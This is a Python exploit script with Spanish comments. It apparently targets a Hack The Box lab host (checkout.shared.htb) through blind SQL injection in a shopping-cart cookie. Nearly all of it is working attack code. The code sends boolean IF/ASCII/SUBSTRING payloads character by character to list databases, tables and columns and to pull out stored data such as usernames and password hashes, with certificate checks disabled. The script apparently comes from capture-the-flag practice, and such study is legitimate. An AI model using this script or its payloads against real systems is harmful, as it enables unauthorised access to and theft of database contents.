#!/usr/bin/python3

import requests
import argparse
import string
import signal
import sys
from pwn import *

from urllib3.exceptions import InsecureRequestWarning
# Borramos warning por no validar el certificado SSL
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# =====================================================*
# Funciones del programa
# =====================================================*

# ___> Controlamos la salida forzada al ejecutar CTRL^C
def exit_with_exit(sig, frame):
    print("\n^C Detectado, saliendo del programa...")
    exit(0)

signal.signal(signal.SIGINT, exit_with_exit)

# ___> Argumentos que tomara el programa
def arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-q', '--query', dest="query", nargs="*", help="Consulta MySQL: Descubre DB, TABLAS, COLUMNAS y sus DATOS.")
    return parser.parse_args()

# =====================================================*
# Clases del programa
# =====================================================*

class ShoppingCartSQLiErrorBased:
    # Esta vaina está pa jugar, diviertanse.

    def __init__(self):
        self.url_site = "https://checkout.shared.htb"
        self.dictionary = string.ascii_letters + string.digits + string.punctuation # para uso general
        #self.dictionary = string.hexdigits # para extrar contraseñas en MD5
        self.result = ""

        self.cookie = 'custom_cart={"CRAAFTKPexploit_part":"1"}' # CRAAFTKP es un ID de un producto existente, lo hacemos para evitar usar OR y que sea más lento

    def send_requests(self, thing_to_extract, draft_payload):
        p1 = log.progress("Payload")

        for row in range(0,60):
            p2 = log.progress(f"{thing_to_extract} [{row}]")
            for pos in range(1,100):
                for letter in self.dictionary + "£":

                    # ---:
                    payload = draft_payload.replace('row',str(row)).replace('pos',str(pos)).replace('ascii_letter',str(ord(letter)))
                    # ---:

                    p1.status(payload)
                    p2.status(self.result + letter)

                    headers = {"Cookie" : self.cookie.replace('exploit_part',payload)}
                    r = requests.get(self.url_site, headers=headers, verify=False)

                    if "Not Found" not in r.text:
                        self.result += letter
                        break

                if pos == 1 and letter == "£":
                    break
                elif letter == "£":
                    p2.success(self.result)
                    self.result = ""
                    break

            if pos == 1 and letter == "£":
                p2.success("------- fin -------")
                break

        p1.success(payload)

    def extract_db(self):
        dbs_to_exclude = "WHERE schema_name <> 'information_schema' AND schema_name <> 'mysql' AND schema_name <> 'performance_schema'"
        payload = f"' AND IF(ASCII(SUBSTRING((SELECT schema_name FROM information_schema.SCHEMATA {dbs_to_exclude} LIMIT row,1),pos,1))=ascii_letter,TRUE,FALSE) AND 1=1#"

        self.send_requests("Base de datos", payload)

    def extract_tables(self, database):
        payload = f"' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.TABLES WHERE table_schema='{database[0]}' LIMIT row,1),pos,1))=ascii_letter,TRUE,FALSE) AND 1=1#"

        self.send_requests("Tabla", payload)

    def extract_columns(self, table):
        payload = f"' AND IF(ASCII(SUBSTRING((SELECT column_name FROM information_schema.COLUMNS WHERE table_schema='{table[0]}' AND table_name='{table[1]}' LIMIT row,1),pos,1))=ascii_letter,TRUE,FALSE) AND 1=1#"

        self.send_requests("Columna", payload)

    def extract_information(self, fields):
        payload = f"' AND IF(ASCII(SUBSTRING((SELECT {fields[2]} FROM {fields[0]}.{fields[1]} LIMIT row,1),pos,1))=ascii_letter,TRUE,FALSE) AND 1=1#"

        self.send_requests(fields[2], payload)

    def print_help(self):
        print(f"usage: {sys.argv[0]} [-h] [-q [QUERY ...]]")
        print("\nopciones:")
        print("  -q, --query   Consulta MySQL: descubre db, tablas, columnas y sus datos.")
        print("\nejemplos:")
        print(f"  {sys.argv[0]} -q (para extraer las bases de datos)")
        print(f"  {sys.argv[0]} -q checkout (para extraer las tablas de una base de datos)")
        print(f"  {sys.argv[0]} -q checkout user (para extraer columnas de una tabla)")
        print(f"  {sys.argv[0]} -q checkout user id / id,username (para extraer / concatenar los datos de una columna)")
        print("\nOpa.")

    def main(self):
        args = arguments()

        try:
            if len(args.query) == 0:
                exploit_sqli.extract_db()
            elif len(args.query) == 1:
                exploit_sqli.extract_tables(args.query)
            elif len(args.query) == 2:
                exploit_sqli.extract_columns(args.query)
            elif len(args.query) == 3:
                exploit_sqli.extract_information(args.query)
            else:
                self.print_help()
        except TypeError:
            self.print_help()

# =====================================================*
# Inicio del programa
# =====================================================*

if '__main__' == __name__:
    exploit_sqli = ShoppingCartSQLiErrorBased()
    exploit_sqli.main()